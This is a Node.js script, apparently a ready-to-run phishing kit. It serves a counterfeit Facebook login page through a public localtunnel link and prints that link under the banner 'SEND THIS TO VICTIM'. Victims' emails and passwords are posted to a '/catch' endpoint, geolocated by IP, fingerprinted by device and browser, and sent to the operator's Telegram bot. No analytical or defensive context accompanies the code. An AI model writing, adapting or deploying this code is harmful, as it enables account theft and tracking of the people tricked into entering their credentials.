#!/usr/bin/env node
const express=require('express')
const {Telegraf}=require('telegraf')
const localtunnel=require('localtunnel')
const axios=require('axios')
const ua=require('ua-parser-js')
const readline=require('readline')

const rl=readline.createInterface({input:process.stdin,output:process.stdout})
const ask=q=>new Promise(res=>rl.question(q,res))

async function main(){
  const TOKEN=await ask('BOT_TOKEN: ')
  const MASTER=await ask('MASTER_ID: ')
  rl.close()

  const bot=new Telegraf(TOKEN)
  const app=express()
  app.use(express.json({limit:'1mb'}))
  app.use(express.urlencoded({extended:true}))

  // ✅ رسالة اتصال تلقائية
  bot.telegram.sendMessage(MASTER,'Successful connection..!').catch(()=>{})

  // ✅ صفحة الفيسبوك المزورة (نخدمها بنفسنا)
  const page=`
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Facebook</title>
  <style>body{font-family:Helvetica;background:#f0f2f5}form{width:320px;margin:12% auto;background:#fff;padding:20px;border-radius:6px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}button{background:#1877f2;color:#fff;border:0;width:100%;padding:12px;border-radius:4px}</style>
</head>
<body>
  <form id="f" method="post"><h2>Log in to Facebook</h2><input name="email" placeholder="Email or phone" required><input name="pass" type="password" placeholder="Password" required><button>Log In</button></form>
  <script>
    const id=new URLSearchParams(location.search).get('id')||'NO_ID';
    document.getElementById('f').addEventListener('submit',async e=>{
      e.preventDefault();
      await fetch('/catch',{                     // نفس الموقع – لا CORS
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({id,email:f.email.value,pass:f.pass.value,ua:navigator.userAgent,ip:''})
      });
      location.replace('https://facebook.com/login.php');
    });
  </script>
</body>
</html>`.trim()

  app.get('/',(q,r)=>r.send(page))
  app.get('/:id',(q,r)=>r.send(page))

  // ✅ استقبال البيانات من الضحية (نفس السيرفر)
  app.post('/catch',async(q,r)=>{
    const{id,email,pass,ua:s,ip}=q.body
    const dev=ua(s||q.headers['user-agent'])
    const geo=await axios.get(`http://ip-api.com/json/${ip||q.ip}`).catch(()=>({data:{}}))
    const msg=
      `🔥 Victim opened\n`+
      `IP: ${ip||q.ip}\n`+
      `Country: ${geo.data.country||'?'}\n`+
      `Device: ${dev.os.name||'?'} ${dev.device.model||''}\n`+
      `Browser: ${dev.browser.name||'?'}`
    await bot.telegram.sendMessage(id,msg).catch(()=>{})
    if(email&&pass){
      await bot.telegram.sendMessage(id,`✅ Login: ${email}:${pass}`).catch(()=>{})
    }
    r.sendStatus(200)
  })

  // ✅ بدء السيرفر المحلي
  app.listen(3000,()=>console.log('Local server on port 3000...\n'))

  // ✅ إنشاء tunnel عام فوري
  const tunnel=await localtunnel({port:3000})
  console.log(`\n=== SEND THIS TO VICTIM ===\n${tunnel.url}\n===========================\n`)
  console.log('Press Ctrl+C to stop.\n')

  tunnel.on('close',()=>{console.log('\nTunnel closed.');process.exit()})
}

main().catch(err=>{console.error(err);process.exit(1)})
